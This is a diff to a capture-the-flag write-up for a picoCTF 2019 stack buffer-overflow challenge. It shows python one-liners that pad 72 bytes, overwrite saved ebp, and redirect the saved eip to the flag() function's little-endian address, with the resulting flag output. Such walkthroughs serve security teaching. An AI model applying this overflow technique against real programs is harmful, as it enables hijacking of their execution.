@@ -16,14 +16,16 @@ On taking a look at the disassembly of the vuln() function , we can clearly see 
 So we need to give an input of 0x48 bytes + 0x4 bytes (to override the saved ebp) + 0x4 bytes (to override the saved eip)
 
 ```
-arch3r@1nv4d3r:~/p1c0CTF_2019/0v3rflow$ python -c 'print("A"*72+"B"*8)' | ./vuln
+arch3r@1nv4d3r:~/p1c0CTF_2019/0v3rflow$ python -c 'print("A"*72+"B"*4+"C"*4)' | ./vuln 
 Give me a string and lets see what happens: 
-Woah, were jumping to 0x42424242 !
+Woah, were jumping to 0x43434343 !
+Segmentation fault (core dumped)
+
 ```
 
-Now , Instead of 4 B's we add in the address of the flag() function in the little endian format.
+Now , Instead of 4 C's we add in the address of the flag() function in the little endian format.
 ```
-arch3r@1nv4d3r:~/p1c0CTF_2019/0v3rflow$ python -c 'print("A"*76+"\xe6\x85\x04\x08")' | ./vuln
+arch3r@1nv4d3r:~/p1c0CTF_2019/0v3rflow$ python -c 'print("A"*72+"B"*4+"\xe6\x85\x04\x08")' | ./vuln
 Give me a string and lets see what happens: 
 Woah, were jumping to 0x80485e6 !
 flag{0v3rfl0w_1}
